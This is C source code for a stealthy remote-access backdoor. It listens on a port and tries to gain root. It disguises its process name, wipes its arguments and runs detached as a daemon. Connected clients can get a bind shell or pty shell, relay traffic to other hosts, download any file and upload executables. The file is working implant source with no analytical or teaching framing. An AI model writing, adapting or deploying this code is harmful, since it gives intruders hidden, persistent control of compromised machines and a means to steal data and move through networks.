#include "common.h"

#include <sys/select.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <fcntl.h>

void handle_signals() {
	struct sigaction sa;

	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = SIG_IGN;
	syscall(SC_SIGACTION, SIGCHLD, (uint32_t) &sa, 0, 0, 0);
}

void do_setuid() {
        syscall(SC_SETUID, 0, 0, 0, 0, 0);
}

void hide(char **argv, char *hidden) {
        syscall(SC_PRCTL, PR_SET_NAME, (uint32_t) hidden, 0, 0, 0);
        memset(argv[0], 0, strlen(argv[0]));
        memcpy(argv[0], hidden, strlen(hidden) + 1);
	memset(argv[1], 0, strlen(argv[1]));
	memset(argv[2], 0, strlen(argv[2]));
}

void daemonize() {
        int ret;

        ret = syscall(SC_FORK, 0, 0, 0, 0, 0);
        if (ret != 0) syscall(SC_EXIT, 0, 0, 0, 0, 0);

        ret = syscall(SC_FORK, 0, 0, 0, 0, 0);
        if (ret != 0) syscall(SC_EXIT, 0, 0, 0, 0, 0);
        for (ret = 0; ret < 3; ret++)
		syscall(SC_CLOSE, ret, 0, 0, 0, 0);
        syscall(SC_SETSID, 0, 0, 0, 0, 0);
}

int listen_on(int port) {
	struct sockaddr_in local;
	int s, ret;

	memset(&local, 0, sizeof(local));
	
	local.sin_family = AF_INET;
	local.sin_port = htons(port);
	local.sin_addr.s_addr = INADDR_ANY;

	s = syscall(SC_SOCKET, AF_INET, SOCK_STREAM, 0, 0, 0);
	
	ret = syscall(SC_BIND, s, (uint32_t) &local, sizeof(local), 0, 0);
	check(2, ret, "Failed to bind socket", 1);

	syscall(SC_LISTEN, s, 0, 0, 0, 0);

	return s;
}

int forward(int source, int dest, int err_report) {
	int r;
	char buf[1024];
	r = syscall(SC_READ, source, (long int) buf, sizeof(buf), 0, 0);
	check(err_report, r, "3 Failed to read", 0);
	if (r <= 0) return r;
	
	r = syscall(SC_WRITE, dest, (long int) buf, r, 0, 0);
	check(err_report, r, "3 Failed to write", 0);
	return r;
}

void communicate(int client, int other) {
	int r;
	int m = (client > other) ? client : other;

	for (;;) {
		fd_set fds;
		FD_ZERO(&fds);
		FD_SET(client, &fds);
		FD_SET(other, &fds);
		r = syscall(SC_SELECT, m + 1, (long int) &fds, 0, 0, 0);
		check(client, r, "3, select failed", 0);
		if (r < 0) return;
		
		if (FD_ISSET(client, &fds)) 
			if (forward(client, other, client) <= 0) break;
		
		if (FD_ISSET(other, &fds))
			if (forward(other, client, client) <= 0) break;
	}
	fputstring(client, "END_OF_COMMUNICATION\n");
	fputstring(client, "0 Connection closed\n");
}

void do_shell(int sock) {
	int r;
	syscall(SC_DUP2, sock, 0, 0, 0, 0);
	syscall(SC_DUP2, sock, 1, 0, 0, 0);
	syscall(SC_DUP2, sock, 2, 0, 0, 0);
	char *argv[] = {"/bin/sh", 0};
	char *envp[] = {0};
	fputstring(sock, "1 Launching shell\n");
	fputstring(sock, "4 SHELL\n");
	r = syscall(SC_EXECVE, (uint32_t) "/bin/sh", (uint32_t) argv, (uint32_t) envp, 0, 0);
	check(sock, r, "3 Failed to exec shell", 0);
}

char *num_append(char *s, int num) {
	int q,r;
	q = (num * 3277) >> 15;
	if (num >= 10) {
		s = num_append(s, q);
	}
	r = num - q*10;
	*s = r + '0';
	s++;
	return s;
}

void do_tty(int sock) {
	fputstring(sock, "1 Launching tty\n");
	int master, slave_id, zero=0, r;
	char slave_name[256] = "/dev/pts/";
	char *ptr;

	master = syscall(SC_OPEN, (long int) "/dev/ptmx", O_RDWR|O_NOCTTY, 0, 0, 0);
	check(sock, master, "3 Failed to open master pty", 0);
	if (master < 0) return;
	
	syscall(SC_IOCTL, master, TIOCGPTN, (long int) &slave_id, 0, 0);
	
	ptr = num_append(slave_name + strlen(slave_name), slave_id);
	*ptr = 0;

	syscall(SC_IOCTL, master, TIOCSPTLCK, (long int) &zero, 0, 0);



	r = syscall(SC_FORK, 0, 0, 0, 0, 0);
	check(sock, r, "3 Fork failed", 0);
	if (r < 0) return;

	if (r == 0) {
		int i;
		char *argv[] = {"/bin/sh", 0};
		char *envp[] = {0};
		
		syscall(SC_CLOSE, master, 0, 0, 0, 0);
		syscall(SC_CLOSE, sock, 0, 0, 0, 0);
			
		syscall(SC_SETSID, 0, 0, 0, 0, 0);
		
		for (i = 0; i < 3; i++)
			syscall(SC_OPEN, (long int) slave_name, O_RDWR, 0, 0, 0);
		
		fputstring(sock, "4 TTY\n");
		r = syscall(SC_EXECVE, (long int) "/bin/sh", (long int) argv, (long int) envp, 0, 0);
		check(sock, r, "Failed to exec shell", 0);
	}
	communicate(sock, master);
	syscall(SC_CLOSE, master, 0, 0, 0, 0);
}

void do_connect(int sock, uint32_t addr, int port) {
	struct sockaddr_in remote;
	int s, ret;

	fputstring(sock, "1 Connecting\n");
	memset(&remote, 0, sizeof(remote));
	remote.sin_family = AF_INET;
	remote.sin_port = htons(port);
	remote.sin_addr.s_addr = addr;

	s = syscall(SC_SOCKET, AF_INET, SOCK_STREAM, 0, 0, 0);

	ret = syscall(SC_CONNECT, s, (uint32_t) &remote, sizeof(remote), 0, 0);
	check(sock, ret, "3 Failed to connect socket", 0);
	if (ret < 0) return;
	
	fputstring(sock, "1 Outgoing socket is connected\n");
	fputstring(sock, "4 CONNECT\n");

	communicate(sock, s);
	syscall(SC_CLOSE, s, 0, 0, 0, 0);
}

void do_bind(int sock, int port) {
	struct sockaddr_in local, remote;
	int remotelen;
	int s, ret, cs;

	fputstring(sock, "1 Binding on port\n");
	memset(&local, 0, sizeof(local));
	
	local.sin_family = AF_INET;
	local.sin_port = htons(port);
	local.sin_addr.s_addr = INADDR_ANY;

	s = syscall(SC_SOCKET, AF_INET, SOCK_STREAM, 0, 0, 0);
	
	ret = syscall(SC_BIND, s, (uint32_t) &local, sizeof(local), 0, 0);
	check(sock, ret, "3 Failed to bind socket", 0);
	if (ret < 0) return;

	syscall(SC_LISTEN, s, 0, 0, 0, 0);

	fputstring(sock, "1 Socket is listening\n");

	memset(&remote, 0, sizeof(remote));
	remotelen = sizeof(remote);
	cs = syscall(SC_ACCEPT, s, (long int) &remote, (long int) &remotelen, 0, 0);
	check(sock, ret, "3 Failed to accept", 0);
	if (cs < 0) return;

	fputstring(sock, "1 Accepted connection\n");
	fputstring(sock, "4 ACCEPT\n");
	fputstring(sock, "ADDR ");
	fputhex(sock, remote.sin_addr.s_addr);
	fputstring(sock, "\nPORT ");
	fputhex(sock, remote.sin_port);
	fputstring(sock, "\n");
	syscall(SC_CLOSE, s, 0, 0, 0, 0);

	communicate(sock, cs);
	syscall(SC_CLOSE, cs, 0, 0, 0, 0);
}

void do_download(int sock, char *path) {
	int fd, size, ret;
	fputstring(sock, "1 Sending file\n");

	fd = syscall(SC_OPEN, (long int) path, O_RDONLY, 0, 0, 0);
	check(sock, fd, "3 Failed to open file", 0);
	if (fd < 0) return;

	fputstring(sock, "1 File opened OK\n");

	fputstring(sock, "4 BINSND\nSIZE ");

	size = syscall(SC_LSEEK, fd, 0, SEEK_END, 0, 0);
	if (size >= 0) {
		fputhex(sock, size);
		syscall(SC_LSEEK, fd, 0, SEEK_SET, 0, 0);
	} else {
		fputstring(sock, "UNKNOWN");
	}
	fputstring(sock, "\n");

	for(;;) {
		ret = forward(fd, sock, sock);
		if (ret <= 0) break;
	}
	if (ret == 0)
		fputstring(sock, "0 File transfer successful\n");

	syscall(SC_CLOSE, fd, 0, 0, 0, 0);
}

void do_upload(int sock, char *path, int size) {
	int total = 0, fd, ret;

	fputstring(sock, "1 Receiving file\n");

	fd = syscall(SC_OPEN, (long int) path, O_WRONLY|O_CREAT|O_TRUNC, 0777, 0, 0);
	check(sock, fd, "3 Failed to open file", 0);
	if (fd < 0) return;

	fputstring(sock, "1 File opened OK\n");

	fputstring(sock, "4 BINRCV\n");


	while (total < size) {
		ret = forward(sock, fd, sock);
		if (ret <= 0) return;

		total += ret;
	}
	fputstring(sock, "0 File transfer successful\n");
	syscall(SC_CLOSE, fd, 0, 0, 0, 0);
}


void handle_command(char *buf, int sock) {
	char *args[16];
	int a;

	a = explode(buf, ' ', args, 16);

	if (!strcmp(args[0], "shell")) {
		do_shell(sock);
	} else if (!strcmp(args[0], "tty")) {
		do_tty(sock);
	} else if (!strcmp(args[0], "bind")) {
		int n;
		if (a != 2) {
			fputstring(sock, "2 usage: bind <port>\n");
			return;
		} 
		n = parse_int(args[1]);
		if ((n < 0) || (n > 65535)) {
			fputstring(sock, "2 port should be between 0 and 65535\n");
			return;
		} 
		do_bind(sock, n);
	} else if (!strcmp(args[0], "connect")) {
		uint32_t addr = 0;
		char *ip[5];
		int i, p, n;

		if (a != 3) {
			fputstring(sock, "2 usage: connect <ip> <port>\n");
			return;
		} 

		p = explode(args[1], '.', ip, 5);
		if (p != 4) {
			fputstring(sock, "2 malformed IP\n");
			return;
		}
		for (i = 3; i >= 0; i--) {
			n = parse_int(ip[i]);
			if ((n < 0) || (n > 255)) {
				fputstring(sock, "2 malformed IP\n");
				return;
			}
			addr <<= 8;
			addr |= n;
		}
		n = parse_int(args[2]);
		if ((n < 0) || (n > 65535)) {
			fputstring(sock, "2 port should be between 0 and 65535\n");
			return;
		}
		do_connect(sock, addr, n);
	} else if (!strcmp(args[0], "download")) {
		if (a != 2) {
			fputstring(sock, "2 usage: download <path>\n");
			return;
		} 
		do_download(sock, args[1]);

	} else if (!strcmp(args[0], "upload")) {
		if (a != 3) {
			fputstring(sock, "2 usage: upload <path> <size>\n");
			return;
		}
		int n = parse_int(args[2]);
		if (n == -1) {
			fputstring(sock, "2 Size should be a number\n");
			return;
		} 
		do_upload(sock, args[1], n);
	} else if (!strcmp(args[0], "help")) {
		fputstring(sock, "1 Available commands: \n");
		fputstring(sock, "1   shell\n");
		fputstring(sock, "1   tty\n");
		fputstring(sock, "1   bind <port>\n");
		fputstring(sock, "1   connect <ip> <port>\n");
		fputstring(sock, "1   upload <path> <size>\n");
		fputstring(sock, "1   download <path>\n");
		fputstring(sock, "1   exit\n");
		fputstring(sock, "0 End of help\n");
	} else if (!strcmp(args[0], "exit")) {
		syscall(SC_EXIT, 0, 0, 0, 0, 0);
	} else {
		fputstring(sock, "2 Unknown command\n");
	}
}

void handle_client(int sock) {
	int r;
	char buf[1024];
	r = syscall(SC_WRITE, sock, (uint32_t) "0 Hello\n", 8, 0, 0);

	for(;;) {
		if (r < 0)
			syscall(SC_EXIT, 0, 0, 0, 0, 0);

		r = syscall(SC_READ, sock, (uint32_t) buf, sizeof(buf), 0, 0);
		if (r <= 0)
			syscall(SC_EXIT, 0, 0, 0, 0, 0);

		buf[r] = 0;
		if (r > 0 && buf[r-1] == '\n')
			buf[r-1] = 0;
		handle_command(buf, sock);
	}
}

void main_loop(int s) {
	int cs, ret, remotelen;
	struct sockaddr_in remote;

	for(;;) {
		memset(&remote, 0, sizeof(remote));
		remotelen = sizeof(remote);
		cs = syscall(SC_ACCEPT, s, (uint32_t) &remote, (uint32_t) &remotelen, 0, 0);
		if (cs < 0) continue;
		
		ret = syscall(SC_FORK, 0, 0, 0, 0, 0);
		if (ret == 0) {
			syscall(SC_CLOSE, s, 0, 0, 0, 0);
			handle_client(cs);
		}
		syscall(SC_CLOSE, cs, 0, 0, 0, 0);
	}
}
int main(int argc, char **argv) {
	int s;

	if (argc != 3) {
		fputstring(1, "usage: ");
		fputstring(1, argv[0]);
		fputstring(1, " <port> <hidden name>\n");
		return 1;
	}

	fputstring(1, "Starting...\n");

	handle_signals();

	do_setuid();

	s = listen_on(parse_int(argv[1]));
	
	hide(argv, argv[2]);

	daemonize();
	
	main_loop(s);

	return 0;
}
